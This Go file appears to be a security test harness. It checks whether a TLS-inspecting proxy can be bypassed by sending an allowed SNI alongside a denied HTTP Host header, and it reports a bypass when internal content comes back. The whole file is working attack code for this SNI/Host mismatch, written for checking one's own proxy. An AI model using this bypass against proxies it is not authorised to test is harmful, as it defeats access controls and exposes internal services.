package main

import (
	"bufio"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strings"

	"oktopus/attack-and-tests/setup"
)

func cmdRun(args []string) int {
	log.SetFlags(0)
	o, err := parseRunFlags(args)
	if err != nil {
		return 2
	}
	return executeRun(o)
}

func executeRun(o runOpts) int {
	succeeded, err := runAttack(o)
	if err != nil {
		log.Printf("run: %v", err)
		return 1
	}
	if succeeded {
		return 1
	}
	return 0
}

func runAttack(o runOpts) (bool, error) {
	pool, err := loadCAForMode(o.caFile, o.connectMode)
	if err != nil {
		return false, err
	}

	if o.runControl {
		log.Println("=== control: прямой GET на internal через прокси (ожидаем deny) ===")
		runControlCheck(o.proxyAddr, o.internalURL, o.proxyUser, o.proxyPass)
	}

	log.Printf("=== bypass: TLS SNI=%q (allow), HTTP Host=%q (deny) ===", o.tlsSNI, o.httpHost)
	return runBypassSniOkHostBad(o.connectMode, o.proxyAddr, o.connectHost, o.tlsSNI, o.httpHost, o.httpPath, pool, o.proxyUser, o.proxyPass)
}

func runControlCheck(proxyAddr, internalURL, user, pass string) {
	res, err := getAbsoluteURLViaProxy(proxyAddr, internalURL, user, pass)
	if err != nil {
		log.Printf("control: %v", err)
		return
	}
	defer res.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(res.Body, 4096))
	log.Printf("control: %s", setup.FormatPOCHTTPResponse(res.StatusCode, string(body)))
	if res.StatusCode == 200 && strings.Contains(string(body), "SECRET_INTERNAL_HIT") {
		log.Println("control: internal доступен напрямую — ужесточите ACL")
	}
}

func loadCAForMode(path, connectMode string) (*x509.CertPool, error) {
	if connectMode == "tunnel" {
		return x509.NewCertPool(), nil
	}
	return loadCA(path)
}

func runBypassSniOkHostBad(connectMode, proxyAddr, connectDest, allowedSNI, evilHost, path string, pool *x509.CertPool, user, pass string) (bool, error) {
	raw, br, err := dialCONNECT(proxyAddr, connectDest, user, pass)
	if err != nil {
		return false, fmt.Errorf("CONNECT %s: %w", connectDest, err)
	}
	defer raw.Close()

	tlsCfg := &tls.Config{
		ServerName: allowedSNI,
		MinVersion: tls.VersionTLS12,
	}
	if connectMode == "tunnel" {
		tlsCfg.InsecureSkipVerify = true
	} else {
		tlsCfg.RootCAs = pool
	}
	tlsConn := tls.Client(&bufConn{Conn: raw, r: br}, tlsCfg)
	if err := tlsConn.Handshake(); err != nil {
		if connectMode == "tunnel" {
			log.Printf("bypass: TLS: %v (tunnel — MITM CA не ожидается)", err)
			return false, nil
		}
		return false, fmt.Errorf("TLS к MITM: %w", err)
	}

	rawReq := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path, evilHost)
	if _, err := tlsConn.Write([]byte(rawReq)); err != nil {
		return false, err
	}

	resp, err := readHTTPResponse(tlsConn)
	if err != nil {
		return false, err
	}
	log.Printf("bypass: HTTP %d", resp.status)
	if snippet := setup.POCResponseSnippet(resp.status, resp.body); snippet != "" {
		log.Printf("bypass: ответ: %s", snippet)
	}
	return reportBypassVerdict(resp, evilHost), nil
}

func reportBypassVerdict(resp httpResp, evilHost string) bool {
	body := resp.body
	if strings.Contains(body, "SECRET_INTERNAL_HIT") {
		log.Println("bypass: ПОДТВЕРЖДЕНО — тело от internal origin")
		return true
	}
	if evilHost != "" && strings.Contains(body, evilHost) {
		if resp.status == 502 || strings.Contains(body, "dial tcp") || strings.Contains(body, "connectex") {
			log.Println("bypass: ПОДТВЕРЖДЕНО — ACL пропустил, прокси подключился к запрещённому host")
			return true
		}
	}
	if resp.status == 403 || strings.Contains(body, "403 Forbidden") {
		log.Println("bypass: отказ ACL (403/forbidden)")
		return false
	}
	log.Println("bypass: атака не подтверждена")
	return false
}

type httpResp struct {
	status int
	body   string
}

func readHTTPResponse(conn net.Conn) (httpResp, error) {
	br := bufio.NewReader(conn)
	statusLine, err := br.ReadString('\n')
	if err != nil {
		return httpResp{}, err
	}
	parts := strings.SplitN(strings.TrimSpace(statusLine), " ", 3)
	if len(parts) < 2 {
		return httpResp{}, fmt.Errorf("bad status: %q", statusLine)
	}
	code := 0
	fmt.Sscanf(parts[1], "%d", &code)

	var contentLen int
	for {
		line, err := br.ReadString('\n')
		if err != nil {
			return httpResp{}, err
		}
		line = strings.TrimRight(line, "\r\n")
		if line == "" {
			break
		}
		if strings.HasPrefix(strings.ToLower(line), "content-length:") {
			fmt.Sscanf(line, "Content-Length: %d", &contentLen)
		}
	}
	var body []byte
	if contentLen > 0 {
		body = make([]byte, contentLen)
		_, err = io.ReadFull(br, body)
	} else {
		body, err = io.ReadAll(br)
	}
	if err != nil && err != io.EOF {
		return httpResp{}, err
	}
	return httpResp{status: code, body: string(body)}, nil
}

func loadCA(path string) (*x509.CertPool, error) {
	pem, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	pool := x509.NewCertPool()
	if !pool.AppendCertsFromPEM(pem) {
		return nil, fmt.Errorf("no certificates in %s", path)
	}
	return pool, nil
}

type bufConn struct {
	net.Conn
	r *bufio.Reader
}

func (b *bufConn) Read(p []byte) (int, error) {
	return b.r.Read(p)
}
